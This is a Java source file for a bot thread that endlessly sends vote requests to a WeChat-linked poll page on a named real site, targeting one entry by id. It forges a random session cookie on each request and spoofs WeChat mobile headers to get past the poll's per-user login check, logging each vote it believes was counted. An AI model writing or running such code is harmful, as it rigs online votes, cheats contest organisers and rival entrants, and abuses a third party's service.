package ltf.wxvoter.voter;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClientBuilder;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Random;
import java.util.concurrent.atomic.AtomicLong;

import static org.apache.http.client.config.RequestConfig.custom;

/**
 * @author ltf
 * @since 17/4/13, 下午4:29
 */
public class WxVoteThread extends Thread {


    static final char[] chars = new char[]{'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f'};
    static private Logger log = LoggerFactory.getLogger(WxVoteThread.class);
    private static AtomicLong count = new AtomicLong(0);
    private Random random = new Random();
    private StringBuilder sb = new StringBuilder(chars.length);

    @Override
    public void run() {
        voteLoop();
    }

    private String randSession() {
        sb.delete(0, sb.length());
        for (int i = 0; i < 32; i++) sb.append(chars[random.nextInt(chars.length)]);
        return sb.toString();
    }

    public void voteLoop() {
        HttpClient http = HttpClientBuilder.create().build();
        HttpGet get = new HttpGet("http://ceshi.veryouth.com/app/index.php?c=entry&do=vote&m=xiaof_toupiao&i=6&type=good&id=345");
        get.setHeader("User-Agent", "Mozilla/5.0 (Linux; Android 5.0.1; SM-N9208V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52 Mobile MQQBrowser/6.2 MicroMessenger/6.5.4.1000 NetType/WIFI");
        get.setHeader("X-Requested-With", "XMLHttpRequest");
        get.setHeader("Referer", "http://ceshi.veryouth.com/app/index.php?c=entry&do=show&m=xiaof_toupiao&i=6&sid=2&id=346&wxref=mp.weixin.qq.com&from=singlemessage");
        get.setConfig(custom().setConnectionRequestTimeout(3000).setConnectTimeout(3000)
                .setSocketTimeout(3000).setRedirectsEnabled(false).build());

        HttpResponse response = null;
        for (; ; ) {
            try {
                get.setHeader("Cookie", "PHPSESSID=" + randSession());
                response = http.execute(get);
                InputStream content = response.getEntity().getContent();
                BufferedReader reader = new BufferedReader(new InputStreamReader(content, "utf8"));
                String line, result = "";
                while ((line = reader.readLine()) != null) result += line + "\n";
                long v = count.incrementAndGet();

                if (!result.contains("oauth2/authorize?appid=wxd5e206b2f3a8e8d") && !result.contains("4006598598")) {
                    System.out.println("success at " + Long.toString(v));
                }
            } catch (IOException e) {
            }
        }
    }

}
